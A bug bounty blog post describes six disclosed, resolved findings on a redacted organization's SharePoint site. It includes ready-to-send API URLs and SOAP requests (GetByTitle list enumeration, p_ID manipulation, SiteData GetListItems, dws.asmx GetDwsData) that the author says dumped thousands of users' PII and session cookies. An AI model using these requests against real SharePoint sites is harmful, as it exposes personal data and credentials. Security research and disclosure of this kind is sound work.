+++
title = "Hunting on Microsoft SharePoint | The art of manipulation"
date = 2024-04-12
[taxonomies]
categories = ["Bug Bounty"]
tags = ["BugBounty", "Infosec", "SharePoint"]
+++

I'll discuss how I discovered that all users' PII was leaked via the Microsoft SharePoint API.

<!-- more -->

## Before Diving

### What is Microsoft SharePoint?

Microsoft SharePoint is an enterprise collaboration and document management platform developed by Microsoft. While it includes Content Management System (CMS) capabilities, it is primarily designed for secure document storage, workflow automation, intranet portals, and team collaboration within organizations. Unlike Joomla and WordPress, which focus mainly on website creation, SharePoint integrates deeply with Microsoft 365 and is widely used for business process automation, knowledge sharing, and enterprise-level content management.

## Report-1

While browsing the site and proxying the traffic through Burp, I noticed an interesting endpoint:

```
bim.redacted.com/_api/web/lists/GetByTitle('Images')/items
```

It was my first time dealing with Microsoft SharePoint, so I experimented by replacing `Images` with other words like `{passwords, keys, emails, users}`. When I entered `Users`... Bang!

{{ image(src="/main.webp", alt="main", width=600) }}

**Note:** While writing this report, all six reports have been resolved, and they have since switched to WordPress. 😆

**Report 1 (High Severity) → Accepted → Resolved**

## Report-2

After submitting the first report, I decided to dig deeper and noticed some SharePoint filtering operators like `{ $select, $filter, $expand }` and `p_ID`. So, I experimented with `$select` and `p_ID`.

### Exploiting the `p_ID` Parameter

```
bim.redacted.com/_api/web/lists/GetByTitle('Users')/items?$skiptoken=Paged=TRUE&p_ID=<ID>&$select=*
```

By manipulating the `p_ID` parameter, I was able to access all users' PII **(5,320 users)**. Additionally, I found that modifying these parameters allowed access to certain system-related data:

```
/_api/Web/Lists(guid'f936a00b-7bea-4ef8-9105-a624755e3fc7')/Items(ID)/FieldValuesForEdit
/_api/Web/Lists(guid'f936a00b-7bea-4ef8-9105-a624755e3fc7')/Items(ID)/FieldValuesAsText
/_api/Web/Lists(guid'f936a00b-7bea-4ef8-9105-a624755e3fc7')/Items(ID)/AttachmentFiles
/_api/Web/Lists(guid'f936a00b-7bea-4ef8-9105-a624755e3fc7')/Items(ID)/Folder
/_api/Web/Lists(guid'f936a00b-7bea-4ef8-9105-a624755e3fc7')/Items(ID)/RoleAssignments
/_api/Web/Lists(guid'f936a00b-7bea-4ef8-9105-a624755e3fc7')/Fields
```

Furthermore, the following URL:

```
/_api/Web/Lists(guid'f936a00b-7bea-4ef8-9105-a624755e3fc7')/ContentTypes
```

exposed sensitive user information across **nine columns**, including **phone numbers, countries, cities, states,** and more.

**Report 2 (High Severity) → Accepted → Resolved**

## Report-3

One month later, I discovered another website within the scope that also used Microsoft SharePoint. I applied the same techniques and successfully identified another vulnerability, leading to a new report submission.

**Report 3 (High Severity) → Accepted → Resolved**

## Report-4

After that, I continued digging deeper into the SharePoint architecture.  

I used tools like [Sparty](https://github.com/adityaks/sparty) and [Sparty-2.0](https://github.com/MayankPandey01/Sparty-2.0) to audit the system. While many endpoints returned a `403 Forbidden` status code, I found that `bim.redacted.com/_vti_bin/spdisco.aspx` was publicly exposed without authentication. This, in itself, is considered an **Information Disclosure Vulnerability** with **high severity**—though its classification depends on the triager's judgment. In my case, the severity was marked as **high**.

### Server Response:

```
HTTP/2 200 OK
Cache-Control: private
Content-Type: text/xml; charset=utf-8
Server: Microsoft-IIS/10.0
X-Sharepointhealthscore: 0
X-Aspnet-Version: 4.0.30319
Sprequestguid: ccaf19a1-c012-006a-9f9e-4d16c9ce2b8f
Request-Id: ccaf19a1-c012-006a-9f9e-4d16c9ce2b8f
X-Frame-Options: SAMEORIGIN
Sprequestduration: 50
Spiislatency: 0
X-Powered-By: ASP.NET
Microsoftsharepointteamservices: 16.0.0.4822
X-Content-Type-Options: nosniff
X-Ms-Invokeapp: 1; RequireReadOnly
Date: Fri, 29 Mar 2024 06:05:10 GMT
Content-Length: 6412

<discovery xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.xmlsoap.org/disco/">
  <contractRef  ref="https://bim.redacted.com/_vti_bin/alerts.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/alerts.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/alerts.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/Authentication.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/Authentication.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/Authentication.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/copy.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/copy.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/copy.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/diagnostics.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/diagnostics.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/diagnostics.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/dspsts.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/dspsts.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/dspsts.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/dws.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/dws.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/dws.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/forms.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/forms.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/forms.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/imaging.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/imaging.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/imaging.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/lists.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/lists.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/lists.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/meetings.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/meetings.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/meetings.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/People.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/People.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/People.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/permissions.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/permissions.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/permissions.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/SharepointEmailWS.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/SharepointEmailWS.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/SharepointEmailWS.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/SiteData.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/SiteData.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/SiteData.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/sites.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/sites.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/sites.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/spsearch.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/spsearch.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/spsearch.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/UserGroup.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/UserGroup.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/UserGroup.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/versions.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/versions.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/versions.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/views.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/views.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/views.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/WebPartPages.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/WebPartPages.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/WebPartPages.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
  <contractRef  ref="https://bim.redacted.com/_vti_bin/webs.asmx?wsdl" docRef="https://bim.redacted.com/_vti_bin/webs.asmx" xmlns="http://schemas.xmlsoap.org/disco/scl/" />
  <discoveryRef ref="https://bim.redacted.com/_vti_bin/webs.asmx?disco" xmlns="http://schemas.xmlsoap.org/disco/" />
</discovery>
```

The response exposed several **sensitive service endpoints**, including:

```
/_vti_bin/alerts.asmx
/_vti_bin/Authentication.asmx
/_vti_bin/copy.asmx
/_vti_bin/diagnostics.asmx
/_vti_bin/dspsts.asmx
/_vti_bin/forms.asmx
/_vti_bin/imaging.asmx
/_vti_bin/lists.asmx
/_vti_bin/People.asmx
/_vti_bin/SiteData.asmx
/_vti_bin/sites.asmx
/_vti_bin/spsearch.asmx
/_vti_bin/UserGroup.asmx
```

At first, accessing these endpoints resulted in a **403 Forbidden** response. However, I didn’t give up and created a new **low-privilege account**. To my surprise, I received a **200 OK** response on many endpoints, including:

- **SiteData**
- **Sites**
- **Lists**  

But some critical ones—like **Authentication, dspsts, forms, and People**—remained forbidden.

### Exploiting SiteData.asmx

The following endpoint was accessible:  
`URL: https://bim.redacted.com/_vti_bin/SiteData.asmx`  

{{ image(src="/SiteData.webp", alt="Site Data", width=600) }}

This endpoint exposed useful functionalities, but I focused on **GetList** and **GetListItems** to extract information about lists.

![GetListItems](/GetListItems.webp)  

The **SOAP request** required `<strListName>` as a mandatory parameter, while `<strQuery>`, `<strViewFields>`, and `<uRowLimit>` were optional.

### Request
```
POST /_vti_bin/SiteData.asmx HTTP/2
Host: bim.redacted.com
Content-Type: text/xml; charset=utf-8
Content-Length: 463
Cookie: Healthy
Soapaction: "http://schemas.microsoft.com/sharepoint/soap/GetListItems"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetListItems xmlns="http://schemas.microsoft.com/sharepoint/soap/">
      <strListName>f936a00b-7bea-4ef8-9105-a624755e3fc7</strListName>
      <uRowLimit>6000</uRowLimit>
    </GetListItems>
  </soap:Body>
</soap:Envelope>
```

Initially, I received a **403 Forbidden** response because I wasn't authenticated. However, when I inserted a **valid low-privilege cookie**, I got a **200 OK** response with **3,066 users' PII**.

**Report 4 (High Severity) → Accepted → Resolved**

## Report-5

Then I accessed `bim.redacted.com/_vti_bin/dws.asmx`, and this turned out to be the most interesting part because I found all users' cookies in decrypted form (two of them belonged to triagers, along with many from other researchers ;D).  

Request:

```
POST /_vti_bin/dws.asmx HTTP/2
Host: bim.redacted.com
Content-Type: text/xml; charset=utf-8
Content-Length: 384
Cookie: Healthy
Soapaction: "http://schemas.microsoft.com/sharepoint/soap/dws/GetDwsData"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetDwsData xmlns="http://schemas.microsoft.com/sharepoint/soap/dws/">
      <document></document>
    </GetDwsData>
  </soap:Body>
</soap:Envelope>
```

I simply sent the request with an empty `<document></document>` element, which turned out to be the key.  

{{ image(src="/Users.webp", alt="Users", width=600) }}

The response also included other properties like `IsSiteAdmin`, `IsDomainGroup`, etc.  

`Report 5 (High Severity, as it only affects confidentiality) -> Accepted -> Resolved`

## Report-6

In my final submission, I reported the exposed URL: `bim.redacted.com/_vti_bin/spdisco.aspx` as an Information Disclosure vulnerability.  

`Report 6 (High Severity) -> Accepted -> Resolved`  

{{ image(src="/Reports.webp", alt="Reports", width=600) }}

Hope you learned something, and thanks for reading ❤.  